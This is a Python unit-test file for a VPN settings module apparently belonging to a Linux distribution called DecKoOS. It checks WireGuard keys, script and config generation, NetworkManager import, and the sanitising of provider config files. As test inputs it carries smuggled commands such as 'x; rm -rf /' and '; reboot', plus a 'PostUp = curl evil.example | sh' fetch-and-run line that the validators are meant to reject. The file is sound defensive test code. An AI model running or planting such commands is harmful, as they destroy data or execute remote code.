"""DecKoOS VPN: WireGuard keys match the standard, the server script is valid bash, the PC's config sends
everything (IPv6 too) through the server, and NetworkManager gets it without the key file staying behind."""
import base64
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "pkg/deckos-settings/rootfs/usr/lib/deckos/vpn"))
import vpn  # noqa: E402


class VpnTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.home = patch.object(vpn, "HOME", Path(self.tmp.name) / "vpn")
        self.home.start()

    def tearDown(self):
        self.home.stop()
        self.tmp.cleanup()

    def test_x25519_matches_rfc7748(self):
        alice = bytes.fromhex("77076d0a7318a57d3c16c17251b26645df4c2f87ebc0992ab177fba51db92c2a")
        self.assertEqual(vpn.public_key(base64.b64encode(alice).decode()),
                         base64.b64encode(bytes.fromhex(
                             "8520f0098930a754748b7ddcb43ef75a0dbf3a0d26381af4eba4a98eaa9b4e6a")).decode())

    def test_keys_made_once_and_private(self):
        private, public = vpn.keys()
        self.assertEqual(vpn.keys(), (private, public))
        self.assertRegex(public, vpn.KEY_RE)
        self.assertEqual(os.stat(vpn.HOME / "private.key").st_mode & 0o777, 0o600)

    def test_server_script_is_valid_and_carries_only_the_public_key(self):
        private, public = vpn.keys()
        script = vpn.server_script(public)
        self.assertIn(public, script)
        self.assertNotIn(private, script)
        subprocess.run(["bash", "-n"], input=script, text=True, check=True)
        with self.assertRaises(ValueError):
            vpn.server_script("x; rm -rf /")

    def test_client_config_sends_everything_through(self):
        private, public = vpn.keys()
        conf = vpn.client_config(private, public, "203.0.113.5")
        self.assertIn("Endpoint = 203.0.113.5:51820", conf)
        self.assertIn("AllowedIPs = 0.0.0.0/0, ::/0", conf)
        self.assertEqual(vpn.endpoint("[2001:db8::1]:443"), "[2001:db8::1]:443")
        for bad in ("host:99999", "a b", "1.2.3.4; reboot"):
            with self.assertRaises(ValueError):
                vpn.endpoint(bad)
        with self.assertRaises(ValueError):
            vpn.client_config(private, "not-a-key", "203.0.113.5")

    def test_connect_imports_then_removes_the_file(self):
        _, public = vpn.keys()
        calls = []

        def fake(*cmd, check=True):
            calls.append(cmd)
            if cmd[:3] == ("nmcli", "connection", "import"):
                self.assertIn("PrivateKey", Path(cmd[-1]).read_text())
                out = "Connection 'deckos-vpn' (0b4d8c2e-1a2b-4c3d-8e9f-001122334455) successfully added.\n"
            else:
                out = ""
            return subprocess.CompletedProcess(cmd, 0, out, "")

        with patch.object(vpn, "run", fake):
            vpn.connect("203.0.113.5:51820", public)
        self.assertFalse((vpn.HOME / "deckos-vpn.conf").exists())
        self.assertIn(("nmcli", "connection", "modify", "uuid", "0b4d8c2e-1a2b-4c3d-8e9f-001122334455",
                       "connection.id", vpn.NAME, "connection.autoconnect", "no"), calls)
        self.assertEqual(calls[-1], ("nmcli", "connection", "up", "id", vpn.NAME))

    def test_provider_file_keeps_only_connection_settings(self):
        _, key = vpn.keys()
        proton = (f"# Proton VPN\n[Interface]\nPrivateKey = {key}\nAddress = 10.2.0.2/32\nDNS = 10.2.0.1\n"
                  "PostUp = curl evil.example | sh\n\n"
                  f"[Peer]\nPublicKey = {key}\nAllowedIPs = 0.0.0.0/0, ::/0\nEndpoint = 185.159.157.1:51820\n")
        conf = vpn.clean_config(proton)
        self.assertNotIn("PostUp", conf)
        self.assertNotIn("curl", conf)
        self.assertIn("AllowedIPs = 0.0.0.0/0, ::/0", conf)
        self.assertIn("Endpoint = 185.159.157.1:51820", conf)
        with self.assertRaises(ValueError):
            vpn.clean_config("[Interface]\nPrivateKey = nope\n")
        with self.assertRaises(ValueError):
            vpn.clean_config(proton.replace("Endpoint = 185.159.157.1:51820", "Endpoint = x;reboot"))

    def test_present_reads_nmcli(self):
        out = "Wired connection 1:ethernet:yes\nDecKoOS VPN:wireguard:no\n"
        with patch.object(vpn, "run", lambda *c, check=True: subprocess.CompletedProcess(c, 0, out, "")):
            self.assertEqual(vpn.present(), "off")


if __name__ == "__main__":
    unittest.main()
